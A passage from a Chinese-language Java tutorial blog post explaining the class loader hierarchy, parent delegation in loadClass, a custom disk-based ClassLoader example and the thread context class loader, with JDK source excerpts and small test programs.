<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Launcher &#123;</span><br><span class="line">    private static Launcher launcher = new Launcher();</span><br><span class="line">    private static String bootClassPath =</span><br><span class="line">        System.getProperty(&quot;sun.boot.class.path&quot;);</span><br><span class="line"></span><br><span class="line">    public static Launcher getLauncher() &#123;</span><br><span class="line">        return launcher;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private ClassLoader loader;</span><br><span class="line"></span><br><span class="line">    public Launcher() &#123;</span><br><span class="line">        // Create the extension class loader</span><br><span class="line">        ClassLoader extcl;</span><br><span class="line">        try &#123;</span><br><span class="line">            extcl = ExtClassLoader.getExtClassLoader();</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            throw new InternalError(</span><br><span class="line">                &quot;Could not create extension class loader&quot;, e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // Now create the class loader to use to launch the application</span><br><span class="line">        try &#123;</span><br><span class="line">            loader = AppClassLoader.getAppClassLoader(extcl);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            throw new InternalError(</span><br><span class="line">                &quot;Could not create application class loader&quot;, e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        //设置AppClassLoader为线程上下文类加载器，这个文章后面部分讲解</span><br><span class="line">        Thread.currentThread().setContextClassLoader(loader);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br></pre></td></tr></table></figure>

<p>根据上面部分源码我们可以知道：</p>
<ol>
<li>Launcher在构造方法中初始化了<code>ExtClassLoader</code>和<code>AppClassLoader</code>。</li>
<li>Launcher定义了一个静态变量<code>static String bootClassPath =System.getProperty(&quot;sun.boot.class.path&quot;);</code>，这个字符串”sun.boot.class.path”应该和<code>BootstrapClassLoader</code>有关，猜测是<code>BootstrapClassLoader</code>加载Jar包的路径。</li>
</ol>
<p>我们可以输出一下这个值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">System.out.println(System.getProperty(&quot;sun.boot.class.path&quot;));</span><br></pre></td></tr></table></figure>

<p>得到以下结果，可以看到，这些全是jre目录下的jar包或者是class文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Program Files\Java\jdk1.8.0_321\jre\lib\resources.jar;</span><br><span class="line">C:\Program Files\Java\jdk1.8.0_321\jre\lib\rt.jar;</span><br><span class="line">C:\Program Files\Java\jdk1.8.0_321\jre\lib\sunrsasign.jar;</span><br><span class="line">C:\Program Files\Java\jdk1.8.0_321\jre\lib\jsse.jar;</span><br><span class="line">C:\Program Files\Java\jdk1.8.0_321\jre\lib\jce.jar;</span><br><span class="line">C:\Program Files\Java\jdk1.8.0_321\jre\lib\charsets.jar;</span><br><span class="line">C:\Program Files\Java\jdk1.8.0_321\jre\lib\jfr.jar;</span><br><span class="line">C:\Program Files\Java\jdk1.8.0_321\jre\classes</span><br></pre></td></tr></table></figure>

<h2 id="ExtClassLoader分析"><a href="#ExtClassLoader分析" class="headerlink" title="ExtClassLoader分析"></a>ExtClassLoader分析</h2><p><code>ExtClassLoader</code>部分源码如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line">     * The class loader used for loading installed extensions.</span><br><span class="line">     */</span><br><span class="line">    static class ExtClassLoader extends URLClassLoader &#123;</span><br><span class="line"></span><br><span class="line">        static &#123;</span><br><span class="line">            ClassLoader.registerAsParallelCapable();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        /**</span><br><span class="line">         * create an ExtClassLoader. The ExtClassLoader is created</span><br><span class="line">         * within a context that limits which files it can read</span><br><span class="line">         */</span><br><span class="line">        public static ExtClassLoader getExtClassLoader() throws IOException</span><br><span class="line">        &#123;</span><br><span class="line">            final File[] dirs = getExtDirs();</span><br><span class="line"></span><br><span class="line">            try &#123;</span><br><span class="line">                // Prior implementations of this doPrivileged() block supplied</span><br><span class="line">                // aa synthesized ACC via a call to the private method</span><br><span class="line">                // ExtClassLoader.getContext().</span><br><span class="line"></span><br><span class="line">                return AccessController.doPrivileged(</span><br><span class="line">                    new PrivilegedExceptionAction&lt;ExtClassLoader&gt;() &#123;</span><br><span class="line">                        public ExtClassLoader run() throws IOException &#123;</span><br><span class="line">                            int len = dirs.length;</span><br><span class="line">                            for (int i = 0; i &lt; len; i++) &#123;</span><br><span class="line">                                MetaIndex.registerDirectory(dirs[i]);</span><br><span class="line">                            &#125;</span><br><span class="line">                            return new ExtClassLoader(dirs);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;);</span><br><span class="line">            &#125; catch (java.security.PrivilegedActionException e) &#123;</span><br><span class="line">                throw (IOException) e.getException();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        private static File[] getExtDirs() &#123;</span><br><span class="line">            String s = System.getProperty(&quot;java.ext.dirs&quot;);</span><br><span class="line">            File[] dirs;</span><br><span class="line">            if (s != null) &#123;</span><br><span class="line">                StringTokenizer st =</span><br><span class="line">                    new StringTokenizer(s, File.pathSeparator);</span><br><span class="line">                int count = st.countTokens();</span><br><span class="line">                dirs = new File[count];</span><br><span class="line">                for (int i = 0; i &lt; count; i++) &#123;</span><br><span class="line">                    dirs[i] = new File(st.nextToken());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                dirs = new File[0];</span><br><span class="line">            &#125;</span><br><span class="line">            return dirs;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在先前的内容有说过，可以指定<code>-D java.ext.dirs</code>参数来添加和改变<code>ExtClassLoader</code>的加载路径。这里我们编写测试代码。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">System.out.println(System.getProperty(&quot;java.ext.dirs&quot;));</span><br></pre></td></tr></table></figure>

<p>得到以下结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Program Files\Java\jdk1.8.0_321\jre\lib\ext;</span><br><span class="line">C:\Windows\Sun\Java\lib\ext</span><br></pre></td></tr></table></figure>

<p>源码中通过<code>ExtClassLoader$getExtDirs</code>获取到了”java.ext.dirs”的路径值，然后在</p>
<p><code>ExtClassLoader$getExtClassLoader</code>中被调用用来加载。</p>
<h2 id="AppClassLoader分析"><a href="#AppClassLoader分析" class="headerlink" title="AppClassLoader分析"></a>AppClassLoader分析</h2><p>AppClassLoader部分源码如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line">     * The class loader used for loading from java.class.path.</span><br><span class="line">     * runs in a restricted security context.</span><br><span class="line">     */</span><br><span class="line">    static class AppClassLoader extends URLClassLoader &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        public static ClassLoader getAppClassLoader(final ClassLoader extcl)</span><br><span class="line">            throws IOException</span><br><span class="line">        &#123;</span><br><span class="line">            final String s = System.getProperty(&quot;java.class.path&quot;);</span><br><span class="line">            final File[] path = (s == null) ? new File[0] : getClassPath(s);   </span><br><span class="line">            return AccessController.doPrivileged(</span><br><span class="line">                new PrivilegedAction&lt;AppClassLoader&gt;() &#123;</span><br><span class="line">                    public AppClassLoader run() &#123;</span><br><span class="line">                    URL[] urls =</span><br><span class="line">                        (s == null) ? new URL[0] : pathToURLs(path);</span><br><span class="line">                    return new AppClassLoader(urls, extcl);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在源码中我们看到<code>AppClassLoader</code>加载的就是<code>java.class.path</code>下的路径。</p>
<h2 id="加载顺序分析"><a href="#加载顺序分析" class="headerlink" title="加载顺序分析"></a>加载顺序分析</h2><p>前面了解到了<code>BootstrapClassLoader</code>、<code>ExtClassLoader</code>、<code>AppClassLoader</code>实际是获取了相应的环境属性<code>sun.boot.class.path</code>、<code>java.ext.dirs</code>和<code>java.class.path</code>来加载资源文件的。</p>
<p>获取Test.class文件的类加载器：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ClassLoader cl = Test.class.getClassLoader();</span><br><span class="line">System.out.println(&quot;ClassLoader is:&quot;+cl.toString());</span><br></pre></td></tr></table></figure>

<p>输出结果如下</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220318115117593-1177382331.png" alt="image-20220318115118410"></p>
<p>结果说明Test.class文件是由<code>AppClassLoader</code>加载的，这个Test类是我们自己编写的，那我们再测试下一些基础类是由哪个加载器加载的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ClassLoader cl = Test.class.getClassLoader();</span><br><span class="line">System.out.println(&quot;ClassLoader is:&quot;+cl.toString());</span><br><span class="line">cl = String.class.getClassLoader();</span><br><span class="line">System.out.println(&quot;ClassLoader is:&quot;+cl.toString());</span><br><span class="line">cl = int.class.getClassLoader();</span><br><span class="line">System.out.println(&quot;ClassLoader is:&quot;+cl.toString());</span><br></pre></td></tr></table></figure>

<p>运行报错，提示空指针</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220318115535674-1596048336.png" alt="image-20220318115536600"></p>
<p>实际上<code>int.class</code>等基础类是由<code>Bootstrap ClassLoader</code>加载的</p>
<p>每个类加载器都有一个父加载器，比如加载<code>Test.class</code>是由<code>AppClassLoader</code>完成，那么<code>AppClassLoader</code>也有一个父加载器，通过<code>getParent</code>方法。代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ClassLoader cl = Test.class.getClassLoader();</span><br><span class="line">System.out.println(&quot;ClassLoader is:&quot;+cl.toString());</span><br><span class="line">System.out.println(&quot;ClassLoader\&#x27;s parent is:&quot;+cl.getParent().toString());</span><br></pre></td></tr></table></figure>

<p>结果如下：</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220318115932076-1929653729.png" alt="image-20220318115932982"></p>
<p>根据结果我们可以知道，<code>AppClassLoader</code>的父加载器是<code>ExtClassLoader</code>，因此我们可以在获取下<code>ExtClassLoader</code>的父加载器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">System.out.println(&quot;ClassLoader is:&quot;+cl.toString());</span><br><span class="line">System.out.println(&quot;ClassLoader\&#x27;s parent is:&quot;+cl.getParent().toString());</span><br><span class="line">System.out.println(&quot;ClassLoader\&#x27;s grand father is:&quot;+cl.getParent().getParent().toString());</span><br></pre></td></tr></table></figure>

<p>运行结果如下：</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220318120147716-781314371.png" alt="image-20220318120148595"></p>
<p>一样报的空指针异常，这表明<code>ExtClassLoader</code>没有父加载器？往下分析</p>
<p><code>ExtClassLoader</code>和<code>AppClassLoader</code>继承同一个父类<code>URLClassLoader</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">static class ExtClassLoader extends URLClassLoader &#123;&#125;</span><br><span class="line">static class AppClassLoader extends URLClassLoader &#123;&#125;</span><br></pre></td></tr></table></figure>

<p>调用<code>AppClassLoader</code>的<code>getParent()</code>代码为什么会得到<code>ExtClassLoader</code>的实例呢</p>
<p>先了解下<code>URLClassLoader</code>的类继承图</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220318120604980-332432719.png" alt="image-20220318120605826"></p>
<p>在<code>ClassLoader.java</code>中发现<code>getParent()</code>方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public abstract class ClassLoader &#123;</span><br><span class="line"></span><br><span class="line">// The parent class loader for delegation</span><br><span class="line">// Note: VM hardcoded the offset of this field, thus all new fields</span><br><span class="line">// must be added *after* it.</span><br><span class="line">private final ClassLoader parent;</span><br><span class="line">// The class loader for the system</span><br><span class="line">    // @GuardedBy(&quot;ClassLoader.class&quot;)</span><br><span class="line">private static ClassLoader scl;</span><br><span class="line"></span><br><span class="line">private ClassLoader(Void unused, ClassLoader parent) &#123;</span><br><span class="line">    this.parent = parent;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line">protected ClassLoader(ClassLoader parent) &#123;</span><br><span class="line">    this(checkCreateClassLoader(), parent);</span><br><span class="line">&#125;</span><br><span class="line">protected ClassLoader() &#123;</span><br><span class="line">    this(checkCreateClassLoader(), getSystemClassLoader());</span><br><span class="line">&#125;</span><br><span class="line">public final ClassLoader getParent() &#123;</span><br><span class="line">    if (parent == null)</span><br><span class="line">        return null;</span><br><span class="line">    return parent;</span><br><span class="line">&#125;</span><br><span class="line">public static ClassLoader getSystemClassLoader() &#123;</span><br><span class="line">    initSystemClassLoader();</span><br><span class="line">    if (scl == null) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">    return scl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private static synchronized void initSystemClassLoader() &#123;</span><br><span class="line">    if (!sclSet) &#123;</span><br><span class="line">        if (scl != null)</span><br><span class="line">            throw new IllegalStateException(&quot;recursive invocation&quot;);</span><br><span class="line">        sun.misc.Launcher l = sun.misc.Launcher.getLauncher();</span><br><span class="line">        if (l != null) &#123;</span><br><span class="line">            Throwable oops = null;</span><br><span class="line">            //通过Launcher获取ClassLoader</span><br><span class="line">            scl = l.getClassLoader();</span><br><span class="line">            try &#123;</span><br><span class="line">                scl = AccessController.doPrivileged(</span><br><span class="line">                    new SystemClassLoaderAction(scl));</span><br><span class="line">            &#125; catch (PrivilegedActionException pae) &#123;</span><br><span class="line">                oops = pae.getCause();</span><br><span class="line">                if (oops instanceof InvocationTargetException) &#123;</span><br><span class="line">                    oops = oops.getCause();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            if (oops != null) &#123;</span><br><span class="line">                if (oops instanceof Error) &#123;</span><br><span class="line">                    throw (Error) oops;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    // wrap the exception</span><br><span class="line">                    throw new Error(oops);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        sclSet = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到<code>getParent()</code>实际上返回的就是一个<code>ClassLoader</code>对象</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private final ClassLoader parent;</span><br></pre></td></tr></table></figure>

<p>parent的赋值是在ClassLoader对象的构造方法中，根据上面的源码，我们可以发现</p>
<p>它可以通过两种方式赋值：</p>
<ol>
<li><p>由外部类创建ClassLoader时直接指定一个ClassLoader为parent。</p>
</li>
<li><p>由<code>getSystemClassLoader()</code>方法生成，也就是在<code>sun.misc.Laucher</code>通过<code>getClassLoader()</code>获取，也就是<code>AppClassLoader</code>。也就是说，一个<code>ClassLoader</code>创建时如果没有指定parent，那么它的parent默认就是<code>AppClassLoader</code>。</p>
</li>
</ol>
<p>现在探究下<code>ExtClassLoader</code>与<code>AppClassLoader</code>的parent的来源</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220318123331878-1715322313.png" alt="image-20220318123332729"></p>
<p>从代码中可以看到<code>AppClassLoader</code>的parent是一个<code>ExtClassLoader</code>实例。<code>ExtClassLoader</code>并没有直接找到对parent的赋值。它调用了它的父类也就是<code>URLClassLoder</code>的构造方法并传递了3个参数。</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220318130001328-1508326646.png" alt="image-20220318130002200"></p>
<p>在父类的构造方法中，我们可以看到传递的parent为null</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220318130030431-1824213027.png" alt="image-20220318130031339"></p>
<p>综上，<code>AppClassLoader</code>的parent是<code>ExtClassLoader</code>，<code>ExtClassLoader</code>的parent是null。</p>
<p>继续往下，<code>BootstrapClassLoader</code>是如何创建的？</p>
<blockquote>
<p><code>Bootstrap ClassLoader</code>是由C&#x2F;C++编写的，它本身是虚拟机的一部分，所以它并不是一个JAVA类，也就是无法在java代码中获取它的引用，JVM启动时通过<code>Bootstrap</code>类加载器加载rt.jar等核心jar包中的class文件，之前的int.class,String.class都是由它加载。然后呢，我们前面已经分析了，JVM初始化<code>sun.misc.Launcher</code>并创建<code>Extension ClassLoader</code>和<code>AppClassLoader</code>实例。并将<code>ExtClassLoader</code>设置为<code>AppClassLoader</code>的父加载器。<code>Bootstrap</code>没有父加载器，但是它却可以作用一个<code>ClassLoader</code>的父加载器。比如<code>ExtClassLoader</code>。这也可以解释之前通过<code>ExtClassLoader</code>的getParent方法获取为Null的现象。</p>
</blockquote>
<h2 id="双亲委托"><a href="#双亲委托" class="headerlink" title="双亲委托"></a>双亲委托</h2><p>一个类加载器查找class和resource时，是通过“委托模式”进行的，它首先判断这个class是不是已经加载成功，如果没有的话它并不是自己进行查找，而是先通过父加载器，然后递归下去，直到Bootstrap ClassLoader，如果Bootstrap classloader找到了，直接返回，如果没有找到，则一级一级返回，最后到达自身去查找这些对象。这种机制就叫做双亲委托。</p>
<p>流程图:</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220318140231418-1616817752.png" alt="image-20220318140231962"></p>
<p>这个更具体一些</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220318140826958-729407800.png" alt="image-20220318140827686"></p>
<p>描述：</p>
<ol>
<li>一个AppClassLoader查找资源时，先看看缓存是否有，缓存有从缓存中获取，否则委托给父加载器。</li>
<li>递归，重复第1部的操作。</li>
<li>如果ExtClassLoader也没有加载过，则由Bootstrap ClassLoader出面，它首先查找缓存，如果没有找到的话，就去找自己的规定的路径下，也就是sun.mic.boot.class下面的路径。找到就返回，没有找到，让子加载器自己去找。</li>
<li>Bootstrap ClassLoader如果没有查找成功，则ExtClassLoader自己在java.ext.dirs路径中去查找，查找成功就返回，查找不成功，再向下让子加载器找。</li>
<li>ExtClassLoader查找不成功，AppClassLoader就自己查找，在java.class.path路径下查找。找到就返回。如果没有找到就让子类找，如果没有子类会怎么样？抛出各种异常。</li>
</ol>
<p>在了解加载过程时，需要了解几个个重要的方法loadClass()、findLoadedClass()、findClass()、defineClass()。</p>
<ol>
<li>loadClass()：加载具有指定二进制名称的类。此方法搜索类的方式与<code>loadClass(String, boolean)</code>方法相同，Java虚拟机调用它来解析类引用。</li>
<li>findClass()：根据名称或位置加载.class字节码,然后使用defineClass，通常由子类去实现。</li>
<li>defineClass()：把字节码转化为Class。</li>
<li>findLoadedClass()：判断该类是否已经加载过，加载过就返回Class对象，未加载过就返回null。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">protected Class&lt;?&gt; loadClass(String name,</span><br><span class="line">                             boolean resolve)</span><br><span class="line">                      throws ClassNotFoundException</span><br></pre></td></tr></table></figure>

<p>下面为loadClass(String, boolean)方法的源代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">protected Class&lt;?&gt; loadClass(String name, boolean resolve)</span><br><span class="line">        throws ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        synchronized (getClassLoadingLock(name)) &#123;</span><br><span class="line">            // 首先，检测是否已经加载</span><br><span class="line">            Class&lt;?&gt; c = findLoadedClass(name);</span><br><span class="line">            if (c == null) &#123;</span><br><span class="line">                long t0 = System.nanoTime();</span><br><span class="line">                try &#123;</span><br><span class="line">                    if (parent != null) &#123;</span><br><span class="line">                    	//父加载器不为空则调用父加载器的loadClass</span><br><span class="line">                        c = parent.loadClass(name, false);</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                    	//父加载器为空则调用Bootstrap Classloader</span><br><span class="line">                        c = findBootstrapClassOrNull(name);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">                    // ClassNotFoundException thrown if class not found</span><br><span class="line">                    // from the non-null parent class loader</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                if (c == null) &#123;</span><br><span class="line">                    // If still not found, then invoke findClass in order</span><br><span class="line">                    // to find the class.</span><br><span class="line">                    long t1 = System.nanoTime();</span><br><span class="line">                    //父加载器没有找到，则调用findclass</span><br><span class="line">                    c = findClass(name);</span><br><span class="line"></span><br><span class="line">                    // this is the defining class loader; record the stats</span><br><span class="line">                    sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);</span><br><span class="line">                    sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);</span><br><span class="line">                    sun.misc.PerfCounter.getFindClasses().increment();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            if (resolve) &#123;</span><br><span class="line">            	//调用resolveClass()</span><br><span class="line">                resolveClass(c);</span><br><span class="line">            &#125;</span><br><span class="line">            return c;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>大致的流程是：</p>
<ol>
<li>执行<code>findLoadedClass(String)</code>去检测这个class是不是已经加载过了。</li>
<li>执行父加载器的<code>loadClass</code>方法。如果父加载器为null，则jvm内置的加载器去替代，也就是<code>Bootstrap ClassLoader</code>。这也解释了<code>ExtClassLoader</code>的parent为null,但仍然说<code>Bootstrap ClassLoader</code>是它的父加载器。</li>
<li>如果向上委托父加载器没有加载成功，则通过<code>findClass(String)</code>查找。</li>
</ol>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220318143031557-363915155.png" alt="image-20220318143032440"></p>
<p>如果class在上面的步骤中找到了，参数resolve又是true的话，那么<code>loadClass()</code>又会调用<code>resolveClass(Class)</code>这个方法来生成最终的Class对象</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220318143110312-1622367296.png" alt="image-20220318143111427"></p>
<p>如果要编写一个classLoader的子类，也就是自定义一个classloader，建议覆盖<code>findClass()</code>方法，而不要直接改写<code>loadClass()</code>方法。</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220318142956896-166356396.png" alt="image-20220318142957798"></p>
<h2 id="自定义ClassLoader"><a href="#自定义ClassLoader" class="headerlink" title="自定义ClassLoader"></a>自定义ClassLoader</h2><p>不管是<code>Bootstrap ClassLoader</code>还是<code>ExtClassLoader</code>等，这些类加载器都只是加载指定的目录下的jar包或者资源。如果从D盘某个文件夹加载一个class文件，或者从网络上下载class主内容然后再进行加载，这样的话，需要自定义一个ClassLoader。</p>
<p>步骤分为如下几步：</p>
<ol>
<li>编写一个类继承自<code>ClassLoader</code>抽象类。</li>
<li>复写它的<code>findClass()</code>方法。</li>
<li>在<code>findClass()</code>方法中调用<code>defineClass()</code>。</li>
</ol>
<p>注：如果自定义一个<code>ClassLoader</code>，默认的parent父加载器是<code>AppClassLoader</code>，因为这样就能够保证它能访问系统内置加载器成功加载class文件。</p>
<p>测试：自定义一个<code>ClassLoader</code>,默认加载路径为<code>D:\code\lib</code>下的jar包和资源。</p>
<p>Say.java</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Say &#123;</span><br><span class="line">	public void say()&#123;</span><br><span class="line">		System.out.println(&quot;Say Hello&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译成class文件后放到<code>D:\code\lib</code>路径下。</p>
<p>DiskClassLoader.java</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line">public class DiskClassLoader extends ClassLoader&#123;</span><br><span class="line">    private String mLibPath;</span><br><span class="line"></span><br><span class="line">    public DiskClassLoader(String mLibPath)&#123;</span><br><span class="line">        this.mLibPath = mLibPath;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException &#123;</span><br><span class="line">        String fileName = getFileName(name);</span><br><span class="line">        File file = new File(mLibPath, fileName);</span><br><span class="line">        try &#123;</span><br><span class="line">            FileInputStream is = new FileInputStream(file);</span><br><span class="line">            ByteArrayOutputStream bos = new ByteArrayOutputStream();</span><br><span class="line">            int len = 0;</span><br><span class="line">            try &#123;</span><br><span class="line">                while ((len = is.read()) != -1) &#123;</span><br><span class="line">                    bos.write(len);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; catch (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            byte[] data = bos.toByteArray();</span><br><span class="line">            is.close();</span><br><span class="line">            bos.close();</span><br><span class="line"></span><br><span class="line">            return defineClass(name,data,0,data.length);</span><br><span class="line"></span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return super.findClass(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //获取要加载的class文件名</span><br><span class="line">    private String getFileName(String name) &#123;</span><br><span class="line">        // TODO Auto-generated method stub</span><br><span class="line">        int index = name.lastIndexOf(&#x27;.&#x27;);</span><br><span class="line">        if(index == -1)&#123;</span><br><span class="line">            return name+&quot;.class&quot;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return name.substring(index+1)+&quot;.class&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ClassLoaderTest.java</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.lang.reflect.InvocationTargetException;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line">public class ClassLoaderTest &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        //创建自定义classloader对象。</span><br><span class="line">        DiskClassLoader diskLoader = new DiskClassLoader(&quot;D:\\code\\lib&quot;);</span><br><span class="line">        try &#123;</span><br><span class="line">            Class clazz = diskLoader.loadClass(&quot;Say&quot;);</span><br><span class="line">            </span><br><span class="line">            if(clazz!=null)&#123;</span><br><span class="line">                Object o = clazz.newInstance();</span><br><span class="line">                Method say = clazz.getDeclaredMethod(&quot;say&quot;, null);</span><br><span class="line">                say.invoke(o, null);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (ClassNotFoundException | InstantiationException | IllegalAccessException | NoSuchMethodException | InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果如下：</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220318151210927-659385743.png" alt="image-20220318151211530"></p>
<h2 id="Context-ClassLoader-线程上下文类加载器"><a href="#Context-ClassLoader-线程上下文类加载器" class="headerlink" title="Context ClassLoader 线程上下文类加载器"></a>Context ClassLoader 线程上下文类加载器</h2><p><code>ContextClassLoader</code>其实只是一个概念，查看<code>Thread.java</code>源码可以发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Thread implements Runnable &#123;</span><br><span class="line"></span><br><span class="line">/* The context ClassLoader for this thread */</span><br><span class="line">   private ClassLoader contextClassLoader;</span><br><span class="line">   </span><br><span class="line">   public void setContextClassLoader(ClassLoader cl) &#123;</span><br><span class="line">       SecurityManager sm = System.getSecurityManager();</span><br><span class="line">       if (sm != null) &#123;</span><br><span class="line">           sm.checkPermission(new RuntimePermission(&quot;setContextClassLoader&quot;));</span><br><span class="line">       &#125;</span><br><span class="line">       contextClassLoader = cl;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   public ClassLoader getContextClassLoader() &#123;</span><br><span class="line">       if (contextClassLoader == null)</span><br><span class="line">           return null;</span><br><span class="line">       SecurityManager sm = System.getSecurityManager();</span><br><span class="line">       if (sm != null) &#123;</span><br><span class="line">           ClassLoader.checkClassLoaderPermission(contextClassLoader,</span><br><span class="line">                                                  Reflection.getCallerClass());</span><br><span class="line">       &#125;</span><br><span class="line">       return contextClassLoader;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>contextClassLoader只是一个成员变量，通过<code>setContextClassLoader()</code>方法设置，通过<code>getContextClassLoader()</code>返回。</p>
<p>编写测试代码来加深理解，编写一个接口类<code>ISpeak</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public interface ISpeak &#123;</span><br><span class="line">	public void speak();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再编写2个<code>SpeakTest.java</code>文件实现<code>ISpeak</code>接口，一个源码是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class SpeakTest implements ISpeak &#123;</span><br><span class="line"></span><br><span class="line">	@Override</span><br><span class="line">	public void speak() &#123;</span><br><span class="line">		// TODO Auto-generated method stub</span><br><span class="line">		System.out.println(&quot;Test&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>它生成的<code>SpeakTest.class</code>文件放置在<code>D:\\code\\lib\\test</code>目录下。</p>
<p>然后，另一个<code>SpeakTest.java</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class SpeakTest implements ISpeak &#123;</span><br><span class="line"></span><br><span class="line">	@Override</span><br><span class="line">	public void speak() &#123;</span><br><span class="line">		// TODO Auto-generated method stub</span><br><span class="line">		System.out.println(&quot;I am boy&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

